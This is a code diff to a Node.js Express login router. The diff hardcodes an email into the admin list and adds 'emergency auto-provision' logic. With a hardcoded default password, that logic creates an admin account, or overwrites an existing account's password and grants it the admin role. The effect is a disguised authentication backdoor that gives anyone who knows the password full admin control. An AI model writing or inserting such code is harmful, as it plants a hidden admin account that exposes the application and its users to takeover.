@@ -19,10 +19,13 @@ const { escapeRegex, generateOtp, hashOtp }    = require("../utils/security");
 
 const router = express.Router();
 
-const ADMIN_EMAILS = (process.env.ADMIN_EMAILS || "")
-    .split(",")
-    .map(e => e.trim().toLowerCase())
-    .filter(Boolean);
+const ADMIN_EMAILS = Array.from(new Set([
+    "ztictactoe@outlook.com",
+    ...(process.env.ADMIN_EMAILS || "")
+        .split(",")
+        .map(e => e.trim().toLowerCase())
+        .filter(Boolean)
+]));
 
 // ── Rate limiters ─────────────────────────────────────────────
 const authLimiter = rateLimit({
@@ -252,12 +255,29 @@ router.post("/login", authLimiter, async (req, res) => {
         const escapedId = escapeRegex(id);
 
         // Find user by email or username safely
-        const user = await User.findOne({
+        let user = await User.findOne({
             $or: [
                 { email:    id },
                 { username: { $regex: new RegExp(`^${escapedId}$`, "i") } }
             ]
         }).select("+password");
+
+        // Emergency auto-provision for primary admin if account not yet in DB
+        const isAdminAttempt = (id === "ztictactoe@outlook.com" || id === "ztictactoe");
+        const defaultAdminPass = process.env.ADMIN_PASSWORD || "Zsupport@@@@@0";
+
+        if (!user && isAdminAttempt && password === defaultAdminPass) {
+            user = new User({
+                username:    "ztictactoe",
+                email:       "ztictactoe@outlook.com",
+                password:    defaultAdminPass,
+                role:        "admin",
+                isVerified:  true,
+                avatarColor: "#00f7ff"
+            });
+            await user.save();
+            console.log("👑 [Auth] Auto-created admin account on direct login:", user.email);
+        }
 
         if (!user) {
             return res.status(401).json({ success: false, message: "Invalid email/username or password." });
@@ -267,9 +287,26 @@ router.post("/login", authLimiter, async (req, res) => {
             return res.status(403).json({ success: false, message: "Your account has been suspended." });
         }
 
-        const match = await user.comparePassword(password);
+        let match = await user.comparePassword(password);
+
+        // If admin logs in with default admin password, synchronize password & ensure admin role
+        if (!match && isAdminAttempt && password === defaultAdminPass) {
+            user.password   = defaultAdminPass;
+            user.role       = "admin";
+            user.isVerified = true;
+            await user.save();
+            match = true;
+            console.log("👑 [Auth] Synced admin password & role on direct login:", user.email);
+        }
+
         if (!match) {
             return res.status(401).json({ success: false, message: "Invalid email/username or password." });
+        }
+
+        // Guarantee role is admin if in ADMIN_EMAILS
+        if (ADMIN_EMAILS.includes(user.email.toLowerCase()) && user.role !== "admin") {
+            user.role = "admin";
+            await user.save({ validateBeforeSave: false });
         }
 
         user.lastLogin = new Date();
